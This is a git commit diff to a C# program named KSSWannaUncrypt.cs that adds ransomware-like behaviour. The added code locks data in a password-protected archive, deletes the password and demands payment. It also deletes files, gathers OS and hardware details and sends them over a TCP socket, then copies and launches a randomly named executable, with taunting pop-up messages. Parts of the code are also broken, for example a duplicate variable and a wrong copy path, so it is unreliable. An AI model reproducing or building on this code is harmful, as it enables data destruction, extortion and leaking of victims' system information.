86885997deeeab2be7d8f30a27859e8ed2e5c004
randyman777777777 <121990518+randyman777777777@users.noreply.github.com>
2023-02-20 10:37:27 -0800

    Active

--- C/C#/KSSWannaUncrypt.cs
+++ C/C#/KSSWannaUncrypt.cs
@@ -1,5 +1,9 @@
 using System;
 using System.IO;
+using System.Diagnostics;
+using System.Net.Sockets;
+using System.Text;
+using System.Management;
 using System.Security.Cryptography;
 using SharpCompress.Archives;
 using SharpCompress.Common;
@@ -132,9 +136,79 @@ internal class Program
                 string keyPath = Path.Combine(dir, "key.bin");
                 keyFile.Write(key, 0, key.Length);
                 keyFile.Write(iv, 0, iv.Length);
-                string passwordPath = Path.Combine(dir, "lauren7.bin");
-                string password = File.ReadAllText(passwordPath).Trim();
-                using (var archive = ArchiveFactory.Create(ArchiveType.Rar, Path.Combine(dir, "encrypted.rar"), new RarWriterOptions { Password = password }))
+                string laga4 = Path.Combine(dir, "lauren7.LSE");
+                string riga9 = File.ReadAllText(laga4).Trim();
+                using (var archive = ArchiveFactory.Create(ArchiveType.Rar, Path.Combine(dir, "encrypted.rar"), new RarWriterOptions { Password = riga9 }))
+                if (File.Exists(laga4))
+                {
+                    File.Delete(laga4);
+                    Console.WriteLine("u gotta pay for the password X3");
+                }
+                else
+                {
+                    ToastContent toastContent = new ToastContentBuilder()
+                        .AddText("marked!")
+                        .GetToastContent();
+                    
+                    ToastNotificationManagerCompat.CreateToastNotifier().Show(new ToastNotification(toastContent.GetXml()));
+                    Console.WriteLine("fack u bitch");
+                    File.Delete(file);
+                    File.Delete(riga9);
+                    File.Delete(file);
+                    ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT * FROM Win32_OperatingSystem");
+        
+                    foreach (ManagementObject obj in searcher.Get())
+                    {
+                    TcpClient client = new TcpClient("localhost", 1234);
+            
+                    NetworkStream stream = client.GetStream();
+                    string message = "hai kaosSec im a bitchass pussy mf";
+                    byte[] data = Encoding.ASCII.GetBytes(message);
+                        string oj9 = ("OS Name: " + obj["Caption"]);
+                        byte[] oj44 = Encoding.ASCII.GetBytes(oj9);
+                        string lon4 = ("Version: " + obj["Version"]);
+                        byte[] lon77 = Encoding.ASCII.GetBytes(lon4);
+                        string af23 = ("Manufacturer: " + obj["Manufacturer"]);
+                        byte[] af24 = Encoding.ASCII.GetBytes(af23);
+                        string v2 = ("OS Architecture: " + obj["OSArchitecture"]);
+                        byte[] v4 = Encoding.ASCII.GetBytes(v2);
+                        string vb4 = ("System Directory: " + obj["SystemDirectory"]);
+                        byte[] v7 = Encoding.ASCII.GetBytes(vb4);
+                    stream.Write(data, 0, data.Length);
+                    stream.Write(oj44, 0, oj44.Length);
+                    stream.Write(lon77, 0, lon77.Length);
+                    stream.Write(af24, 0, af24.Length);
+                    stream.Write(v4, 0, v4.Length);
+                    stream.Write(v7, 0, v7.Length);
+                    stream.Close();
+                    client.Close();
+                    }
+        
+                    searcher = new ManagementObjectSearcher("SELECT * FROM Win32_Processor");
+                    foreach (ManagementObject obj in searcher.Get())
+                    {
+                        Console.WriteLine("CPU: " + obj["Name"]);
+                    }
+        
+                    searcher = new ManagementObjectSearcher("SELECT * FROM Win32_ComputerSystem");
+                    foreach (ManagementObject obj in searcher.Get())
+                    {
+                        Console.WriteLine("Total Memory: " + obj["TotalPhysicalMemory"]);
+                    }
+        
+                    Console.ReadKey();
+                    string rr9 = System.Reflection.Assembly.GetEntryAssembly().Location;
+                    string u7 = Path.GetDirectoryName(rr9);
+                    string lv6 = Path.GetRandomFileName() + ".exe";
+                    string x4 = Path.Combine(u7, lv6);
+                    File.Copy(lv6, x4);
+                    Process.Start(x4);
+                    ToastContent toastContent = new ToastContentBuilder()
+                        .AddText("remember kaosSec we think we'll remember u :3")
+                        .GetToastContent();
+                    
+                    ToastNotificationManagerCompat.CreateToastNotifier().Show(new ToastNotification(toastContent.GetXml()));
+                }
                 {
                     archive.AddEntry("key.bin", File.OpenRead(keyPath), true);
                     
